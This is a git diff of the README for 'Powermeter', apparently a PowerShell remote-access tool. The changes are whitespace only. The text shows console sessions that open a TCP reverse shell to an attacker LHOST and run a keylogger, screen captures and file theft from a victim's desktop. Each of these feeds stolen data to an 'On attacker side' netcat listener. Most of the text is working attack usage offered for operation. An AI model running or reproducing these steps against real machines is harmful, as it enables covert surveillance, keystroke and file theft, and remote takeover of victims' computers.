@@ -72,29 +72,29 @@ Powermeter>get sysinfo
 #### set FLPORT=\<PORT>
 
 Powershell>set FLPORT=9192  
-[+]FLPORT is set
+[+]FLPORT is set  
 
 ![pm4](https://github.com/mfcekirdek/Powermeter/blob/master/pm4.png "pm4")
 
 #### get username
 
-Powermeter>get username
-decoder
+Powermeter>get username  
+decoder  
 
 ![pm5](https://github.com/mfcekirdek/Powermeter/blob/master/pm5.png "pm5")
 
 #### rshell
 
-[prerequisite]: 
-On attacker side> nc -lvp 9191
+[prerequisite]:  
+On attacker side> nc -lvp 9191  
 
-Powermeter>rshell
-Powermeter>reverse_shell>set LHOST=192.168.214.1
-[+]LHOST is set
-Powermeter>reverse_shell>set LPORT=9191
-[+]LPORT is set
-Powermeter>reverse_shell>run
-Powermeter>reverse_shell>[+]TCP reverse shell
+Powermeter>rshell  
+Powermeter>reverse_shell>set LHOST=192.168.214.1  
+[+]LHOST is set  
+Powermeter>reverse_shell>set LPORT=9191  
+[+]LPORT is set  
+Powermeter>reverse_shell>run  
+Powermeter>reverse_shell>[+]TCP reverse shell  
 
 ![pm6](https://github.com/mfcekirdek/Powermeter/blob/master/pm6.png "pm6")
 
@@ -115,8 +115,8 @@ Powermeter>reverse_shell>show options
 
 #### stop job -reverseShell (stop job -rs)
 
-Powermeter>stop job -reverseShell
-[+]ReverseShellJob is terminated..
+Powermeter>stop job -reverseShell  
+[+]ReverseShellJob is terminated..  
 
 ![pm8](https://github.com/mfcekirdek/Powermeter/blob/master/pm8.png "pm8")
 
@@ -143,19 +143,19 @@ State         : Running
 
 #### stop job -all
 
-Powermeter>stop job -all
-[+]ReverseShellJob is terminated..
-[+]ReceiveFileJob is terminated..
+Powermeter>stop job -all  
+[+]ReverseShellJob is terminated..  
+[+]ReceiveFileJob is terminated..  
 
 ![pm10](https://github.com/mfcekirdek/Powermeter/blob/master/pm10.png "pm10")
 
 #### screencap -screen
 
-[prerequisite]: 
-On attacker side> nc -lvp 9192 > screenshot.png
+[prerequisite]:  
+On attacker side> nc -lvp 9192 > screenshot.png  
 
-Powermeter>screencap -screen
-[+]Screenshot saved..
+Powermeter>screencap -screen  
+[+]Screenshot saved..  
 
 ![pm12](https://github.com/mfcekirdek/Powermeter/blob/master/pm12.png "pm12")
 
@@ -163,11 +163,11 @@ Powermeter>screencap -screen
 
 #### screencap -activeWindow
 
-[prerequisite]: 
-On attacker side> nc -lvp 9192 > screenshotActiveWindow.png
+[prerequisite]:   
+On attacker side> nc -lvp 9192 > screenshotActiveWindow.png  
 
-Powermeter>screencap -activeWindow
-[+]Screenshot is saving..
+Powermeter>screencap -activeWindow  
+[+]Screenshot is saving..  
 
 ![pm14](https://github.com/mfcekirdek/Powermeter/blob/master/pm2.png "pm14")
 
@@ -175,13 +175,13 @@ Powermeter>screencap -activeWindow
 
 #### start keylogger & stop job -keylogger
 
-[prerequisite]: 
-On attacker side> nc -lvp 9192 > log.txt
+[prerequisite]:   
+On attacker side> nc -lvp 9192 > log.txt  
 
-Powermeter>start keylogger
-[+]KeyLogger is starting..
-Powermeter>stop job -keylogger
-[+]Keylogger is terminated..
+Powermeter>start keylogger  
+[+]KeyLogger is starting..  
+Powermeter>stop job -keylogger  
+[+]Keylogger is terminated..  
 
 ![pm15](https://github.com/mfcekirdek/Powermeter/blob/master/pm15.png "pm15")
 
@@ -189,11 +189,11 @@ Powermeter>stop job -keylogger
 
 #### download <file>
 
-[prerequisite]: 
-On attacker side> nc -lvp 9192 > downloadedFile
+[prerequisite]:   
+On attacker side> nc -lvp 9192 > downloadedFile  
 
-Powermeter>download C:\Users\decoder\Desktop\cozbeni.zip
-[+]File is downloading..
+Powermeter>download C:\Users\decoder\Desktop\cozbeni.zip  
+[+]File is downloading..  
 
 ![pm18](https://github.com/mfcekirdek/Powermeter/blob/master/pm18.png "pm18")
 
@@ -201,11 +201,11 @@ Powermeter>download C:\Users\decoder\Desktop\cozbeni.zip
 
 #### upload <file>
 
-[prerequisite]: 
-On attacker side> nc -lvp 9192 \< uploadedFile
+[prerequisite]:   
+On attacker side> nc -lvp 9192 \< uploadedFile  
 
-Powermeter>upload C:\Users\decoder\Desktop\img.jpg
-[+]File is uploading..
+Powermeter>upload C:\Users\decoder\Desktop\img.jpg  
+[+]File is uploading..  
 
 ![pm20](https://github.com/mfcekirdek/Powermeter/blob/master/pm20.png "pm20")
 
